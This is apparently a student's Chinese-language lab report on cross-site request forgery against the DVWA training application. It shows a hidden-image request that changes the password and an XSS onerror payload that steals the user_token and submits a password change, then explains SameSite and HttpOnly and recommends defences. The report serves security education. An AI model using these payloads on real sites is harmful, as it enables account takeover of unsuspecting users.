# 第七周：CSRF 跨站请求伪造漏洞实验报告

> 实验环境：DVWA、Burp Suite、现代浏览器（Chrome/Edge）
> 实验目标：理解 CSRF 原理，掌握纯前端钓鱼网页构造，理解 Medium 级别的 Token 防御与 XSS+CSRF 组合拳绕过。

## 一、实验概述

CSRF 的本质是「借刀杀人」：利用受害者已登录的凭证（Cookie），伪造合法请求执行非预期操作。

## 二、Low 级别：基础攻击与浏览器防御机制

Low 级别下，改密码是无校验的 GET 请求，服务器只依赖浏览器自动携带的 `PHPSESSID`：

```text
GET /DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

PoC 恶意网页（`<img>` 静默发起请求）：

```html
<img src="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;">
```

**核心考点：为什么纯前端攻击失败？** Burp 抓包发现浏览器跨域静默请求时自动剥离了 `PHPSESSID` Cookie。根因是现代浏览器默认 `SameSite=Lax`——跨域静默请求（`<img>`/`<iframe>`）不具备顶级导航属性，浏览器拒绝携带 Cookie。

**漏洞真实存在的验证**：用 Burp Repeater 手动构造带 Cookie 的请求重放，服务器返回 200 OK、密码成功修改，证明后端确实缺乏 CSRF 防护，只是被浏览器前端拦截了。

## 三、Medium 级别：Token 防御与 XSS 组合拳

Medium 引入 `user_token` 校验：每次请求生成随机 Token 嵌入表单，提交时必须带上。纯 CSRF 失效（同源策略无法跨域读动态 Token）。

**绕过思路（XSS + CSRF 组合拳）**：若目标同时存在 XSS，在同源环境用 JS 偷 Token 并自动提交（同源不触发 SameSite 拦截）：

```html
<img src=x onerror="
fetch('/DVWA/vulnerabilities/csrf/')
.then(r=>r.text())
.then(h=>{
  let t=h.match(/name='user_token' value='([^']+)'/);
  if(t) {
    fetch('/DVWA/vulnerabilities/csrf/', {
      method:'POST',
      body:'password_new=pwned&password_conf=pwned&Change=Change&user_token='+t[1]
    });
  }
})">
```

## 四、底层安全机制解析

### SameSite Cookie 策略

| 取值 | 行为 |
|------|------|
| Strict | 绝对禁止跨站携带 Cookie（防 CSRF 最强，体验差） |
| Lax（默认） | 仅 `<a>` 顶层导航 GET 携带；拦截 `<img>`/`<script>` 子资源请求 |
| None | 不设防，必须配合 `Secure`（仅 HTTPS） |

### HttpOnly 属性

服务器给 `PHPSESSID` 加 `HttpOnly` 后，`document.cookie` 返回空字符串，禁止 JS 读取 Cookie，有效防 XSS 窃取凭证。

## 五、实验记录表

| 记录项 | 内容 |
|--------|------|
| 实验模块 | CSRF（跨站请求伪造） |
| 安全级别 | Low / Medium |
| Low PoC | `<img src=".../csrf/?password_new=hacked...">` |
| 执行结果 | 浏览器拦截跨域 Cookie（SameSite=Lax），纯前端失败；Burp 重放成功 |
| Medium 防御 | 随机 `user_token` + POST |
| Medium 绕过 | XSS 同源 fetch 取 Token 并发送 POST |

## 六、防御修复建议

**针对 CSRF**：严格使用一次性随机 CSRF Token；验证 Referer/Origin 头；敏感操作二次验证；配置 `SameSite=Strict`。

**针对 XSS 组合拳**：HTML 实体编码输入；配置严格 CSP；敏感 Cookie 设 HttpOnly。

> 复盘心得：本次实验最大的收获不仅在于学会构造 CSRF 钓鱼页面，更在于认识到浏览器的安全机制（SameSite、HttpOnly）在不修改后端代码的情况下，能极大缓解前端攻击；而实战中单一漏洞越来越少，XSS 配合 CSRF 的「组合拳」往往是突破防线的最强手段。
